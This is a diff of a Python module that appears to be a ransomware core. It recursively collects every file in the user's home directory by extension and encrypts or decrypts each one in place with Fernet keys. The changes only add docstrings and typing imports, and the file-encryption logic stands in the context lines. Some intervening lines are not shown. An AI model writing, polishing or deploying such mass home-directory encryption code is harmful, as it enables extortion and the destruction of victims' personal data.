@@ -1,18 +1,24 @@
-#!/usr/bin/env python3
 import os
 import mmap
 import shutil
 from pathlib import Path
+from typing import Dict, List
 
 from lib.modules.yaml import safe_load
 from lib.cryptography.fernet import Fernet
 
 
-def List_Files() -> dict[str, list[str]]:
+def List_Files() -> Dict[str, List[str]]:
+    """
+    Lists files in the user's home directory categorized by file extension.
+
+    Returns:
+        Dict[str, List[str]]: A dictionary where keys are file extensions and values are lists of file paths.
+    """
     with open('scripts/extensions.yaml', 'r') as file:
         exts = safe_load(file)
 
-    file_categories: dict[str, list[str]] = {category: [] for category in exts}
+    file_categories: Dict[str, List[str]] = {category: [] for category in exts}
     extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}
 
     for entry in Path.home().rglob('*'):
@@ -23,6 +29,13 @@ def List_Files() -> dict[str, list[str]]:
 
 
 def Process_Files(Private: Fernet, mode: str) -> None:
+    """
+    Encrypts or decrypts files based on the specified mode.
+
+    Args:
+        Private (Fernet): An instance of the Fernet class.
+        mode (str): Either 'encrypt' or 'decrypt'.
+    """
     for _, files in List_Files().items():
         for file in files:
             temp_file = file + '.temp'
@@ -44,8 +57,20 @@ def Process_Files(Private: Fernet, mode: str) -> None:
 
 
 def Encrypt(Private: Fernet) -> None:
+    """
+    Encrypts files using Fernet encryption.
+
+    Args:
+        Private (Fernet): An instance of the Fernet class.
+    """
     Process_Files(Private, 'encrypt')
 
 
 def Decrypt(Private: Fernet) -> None:
+    """
+    Decrypts files using Fernet decryption.
+
+    Args:
+        Private (Fernet): An instance of the Fernet class.
+    """
     Process_Files(Private, 'decrypt')
